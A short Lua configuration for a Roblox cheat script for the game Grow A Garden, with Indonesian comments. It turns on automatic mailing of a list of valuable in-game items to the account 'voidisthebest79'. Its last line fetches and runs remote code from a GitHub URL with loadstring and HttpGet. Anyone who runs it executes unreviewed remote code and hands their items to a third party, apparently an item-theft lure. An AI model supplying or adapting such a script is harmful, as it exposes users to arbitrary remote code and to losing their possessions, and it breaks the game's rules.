getgenv().Config = {

  -- Field dasar yang biasanya dicek script saat startup
  ["Main Features"] = {
    ["Auto Plant"] = false,
    ["Auto Sell"] = false,
    ["Auto Buy Seed"] = false,
    ["Auto Buy Gear"] = false,
    ["Auto Use Gear"] = false
  },

  ["Other Features"] = {
    ["Auto Shovel"] = false,
    ["Auto Catch Pet"] = false,
    ["Auto Equip Pets"] = false,
    ["Auto Optimize Pets"] = false,
    ["Auto Upgrade Pet Slots"] = false,
    ["Auto Tutorial"] = false
  },

  ["Codes"] = {
    ["Auto Redeem Codes"] = false,
    ["Codes To Redeem"] = {}
  },

  -- MAIL SYSTEM — yang kamu butuhkan
  ["Auto Send Mail"] = true,

  ["Mail To Send"] = {
    ["voidisthebest79"] = {
      Note = "gift",
      Items = {
        "Golden Dragonfly",
        "Unicorn",
        "Raccoon",
        "Rainbow",
        "Gold",
        "Super Sprinkler",
        "Super Watering Can",
      },
    },
  },
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/refs/heads/main/Kaitun/Grow%20A%20Garden%202", true))()
